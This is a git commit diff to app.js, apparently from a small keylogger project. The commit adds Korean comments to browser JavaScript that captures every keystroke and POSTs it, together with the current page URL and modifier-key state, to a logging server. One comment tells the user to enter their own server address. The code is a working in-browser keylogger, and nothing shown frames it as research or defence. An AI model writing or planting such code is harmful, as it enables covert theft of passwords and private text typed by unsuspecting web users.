491e1228b16a0f10f2c5fb1befbb46522a4f6734
Quema <105044971+Quema100@users.noreply.github.com>
2023-05-16 01:01:30 +0900

    Update app.js

--- app.js
+++ app.js
@@ -1,11 +1,11 @@
 document.addEventListener('keydown', (event) => {
   key=event.key
   const xhr = new XMLHttpRequest();
-  xhr.open('POST', 'https://localhost:8080/log');
+  xhr.open('POST', 'https://localhost:8080/log'); // 자신의 서버 주소 입력
   xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
-  xhr.send(JSON.stringify({
-    key: event.key,
-    window: window.location.href,
+  xhr.send(JSON.stringify({ 
+    key: event.key, // 누른 키
+    window: window.location.href, // 현재 페이지 링크
     keyCode: event,
     shiftKey: event.shiftKey,
     ctrlKey: event.ctrlKey,
